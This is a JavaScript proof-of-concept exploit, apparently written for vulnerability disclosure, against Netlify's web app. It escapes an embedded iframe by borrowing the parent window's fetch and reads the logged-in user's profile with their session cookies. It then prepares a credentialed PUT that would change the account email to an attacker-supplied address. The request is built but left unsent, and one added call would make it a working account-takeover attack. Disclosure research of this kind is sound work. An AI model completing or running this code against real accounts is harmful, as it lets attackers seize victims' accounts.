(() => {
  const USER_ENDPOINT =
    "https://app.netlify.com/access-control/bb-api/api/v1/user";

  let host;

  try {
    host =
      window.parent &&
      window.parent !== window &&
      window.parent.location.origin === "https://app.netlify.com"
        ? window.parent
        : window;
  } catch {
    host = window;
  }

  // Capture parent capabilities before Workflow UI applies its sandbox.
  const hostOrigin = host.location.origin;
  const hostUrl = new URL(host.location.href);
  const hostFetch = host.fetch.bind(host);
  const requestedEmail = hostUrl.searchParams.get("email");

  const result = {
    hostOrigin,
    requestedEmailPresent: Boolean(requestedEmail),
    authenticatedRead: false,
    userIdentifierPresent: false,
    requestPrepared: false,
    sent: false,
    proposedRequest: null,
    error: null
  };

  host.__NETLIFY_EMAIL_CHANGE_SAFE_POC__ = result;

  (async () => {
    if (hostOrigin !== "https://app.netlify.com") {
      throw new Error(`Unexpected execution origin: ${hostOrigin}`);
    }

    if (!requestedEmail) {
      throw new Error("Missing ?email= query parameter");
    }

    const response = await hostFetch(USER_ENDPOINT, {
      method: "GET",
      credentials: "include",
      cache: "no-store",
      headers: {
        Accept: "application/json"
      }
    });

    if (!response.ok) {
      throw new Error(`GET /user failed: HTTP ${response.status}`);
    }

    const currentUser = await response.json();

    result.authenticatedRead = true;
    result.userIdentifierPresent = Boolean(currentUser.id);

    result.proposedRequest = {
      url: USER_ENDPOINT,
      options: {
        method: "PUT",
        mode: "cors",
        credentials: "include",
        cache: "no-store",
        headers: {
          Accept: "*/*",
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          full_name: currentUser.full_name,
          email: requestedEmail,
          preferred_account_id:
            currentUser.preferred_account_id || ""
        })
      }
    };

    result.requestPrepared = true;

    console.info("file11.js safe PoC completed", {
      hostOrigin: result.hostOrigin,
      requestedEmailPresent: result.requestedEmailPresent,
      authenticatedRead: result.authenticatedRead,
      userIdentifierPresent: result.userIdentifierPresent,
      requestPrepared: result.requestPrepared,
      sent: result.sent
    });
  })().catch((error) => {
    result.error = String(error);
    console.error("file11.js failed:", error);
  });
})();
